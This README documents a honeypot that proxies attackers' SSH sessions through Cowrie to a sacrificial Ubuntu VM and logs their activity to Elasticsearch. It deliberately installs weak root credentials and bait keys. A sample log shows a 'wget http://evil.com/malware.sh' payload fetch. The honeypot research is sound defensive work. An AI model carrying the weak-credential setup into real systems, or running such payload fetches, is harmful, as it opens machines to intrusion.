# Sacrificial VM Honeypot with Cowrie Proxy

High-interaction honeypot that gives attackers a **real shell** while logging everything.

## How It Works

```
Attacker → T-Pot Cowrie → Sacrificial VM (real Ubuntu)
              │                    │
              │                    ├── auditd (all commands)
              │                    ├── Suricata (all network)
              └── logs creds       └── PCAP (full capture)
                                         │
                                         ▼
                               Your Elasticsearch/Grafana
```

1. Attacker SSHs to your T-Pot
2. Cowrie logs the credentials they try
3. On successful auth, Cowrie **proxies the session** to the sacrificial VM
4. Attacker gets a real bash shell
5. Everything they do is logged invisibly

## What You'll See

- **Every command** they run (via auditd)
- **Every file** they download (via Suricata file extraction)
- **Every C2 connection** they make (via Suricata + PCAP)
- **Full packet capture** for forensics

## Setup

### Step 1: Create the Sacrificial VM

Create a new Ubuntu 22.04 VM on your honeypot VLAN (192.168.40.0/24).

```bash
# On the new VM:
wget https://raw.githubusercontent.com/YOUR_REPO/ELKIE/main/scripts/sacrificial-vm/vm-setup/setup-sacrificial-vm.sh
chmod +x setup-sacrificial-vm.sh
sudo ./setup-sacrificial-vm.sh 192.168.40.1:9200
```

This installs:
- Weak passwords (root:root, admin:admin)
- Auditd with comprehensive logging
- Suricata for network capture
- Filebeat shipping to your Elasticsearch
- Bait files (fake AWS keys, SSH keys, etc.)

### Step 2: Take a Snapshot

Before connecting it to Cowrie, snapshot the VM. You'll restore to this after compromises.

### Step 3: Configure Cowrie Proxy

On your T-Pot host:

```bash
cd /path/to/ELKIE/scripts/sacrificial-vm
./install-cowrie-proxy.sh 192.168.40.20 honeypot "honeypot_backend_pass_change_me"
```

### Step 4: Verify

```bash
# Test the proxy chain
ssh root@your-tpot-ip -p 2222
# Password: root

# You should now be on the sacrificial VM
hostname  # Should show sacrificial VM hostname
```

## Logging

All logs go to Elasticsearch with these indices:

| Index | Contents |
|-------|----------|
| `honeypot-sacrificial-*` | Auditd commands, Suricata alerts, auth logs |
| `cowrie-*` | Cowrie credential logs (unchanged) |

### Sample Events

**Command executed:**
```json
{
  "log_type": "auditd",
  "audit.type": "EXECVE",
  "process.command_line": "wget http://evil.com/malware.sh",
  "process.pid": 4521,
  "user.id": 0,
  "honeypot_type": "sacrificial-vm"
}
```

**C2 connection:**
```json
{
  "log_type": "suricata",
  "event_type": "flow",
  "destination.ip": "185.234.52.17",
  "destination.port": 443,
  "destination.geo.country_name": "Russia",
  "flow.bytes_toclient": 8234
}
```

## Network Isolation

The sacrificial VM should be on an isolated VLAN:

```
┌─────────────────────────────────────────┐
│  Honeypot VLAN (192.168.40.0/24)        │
│                                          │
│  ┌──────────┐       ┌──────────────┐    │
│  │  T-Pot   │       │ Sacrificial  │    │
│  │  .10     │──────▶│ VM  .20      │    │
│  └──────────┘       └──────────────┘    │
│                            │             │
└────────────────────────────┼─────────────┘
                             │
                    ┌────────▼────────┐
                    │    Firewall     │
                    │                 │
                    │ ALLOW: Internet │
                    │ BLOCK: Your LAN │
                    └─────────────────┘
```

## Maintenance

### After a Compromise

```bash
# Option 1: Reset script (quick cleanup)
ssh sacrificial-vm '/root/honeypot-reset.sh'

# Option 2: Restore snapshot (full reset)
# Use your hypervisor's snapshot restore
```

### Viewing Captured Files

```bash
# Malware downloads captured by Suricata
ssh sacrificial-vm 'ls -la /var/log/suricata/files/'

# Copy for analysis
scp sacrificial-vm:/var/log/suricata/files/SHA256_HASH ./samples/
```

### PCAP Analysis

```bash
# Download PCAP for a specific time
scp sacrificial-vm:/var/log/honeypot-pcap/capture-20241218-1400*.pcap ./

# Open in Wireshark
wireshark capture-20241218-1400*.pcap
```

## Files

```
sacrificial-vm/
├── vm-setup/
│   └── setup-sacrificial-vm.sh    # Run this on the VM
├── cowrie-proxy/
│   └── cowrie-proxy.cfg           # Cowrie configuration
├── monitoring/
│   └── elasticsearch-pipeline.json # ES ingest pipeline
├── install-cowrie-proxy.sh        # Run this on T-Pot host
└── README.md
```

## Troubleshooting

### Cowrie not forwarding sessions

```bash
# Check Cowrie logs
docker logs cowrie | grep -i proxy

# Verify VM is reachable from Cowrie container
docker exec cowrie ping 192.168.40.20
```

### No logs in Elasticsearch

```bash
# Check Filebeat on VM
ssh sacrificial-vm 'systemctl status filebeat'
ssh sacrificial-vm 'filebeat test output'
```

### Auditd not logging

```bash
# Check audit status
ssh sacrificial-vm 'auditctl -s'
ssh sacrificial-vm 'ausearch -m execve | tail'
```
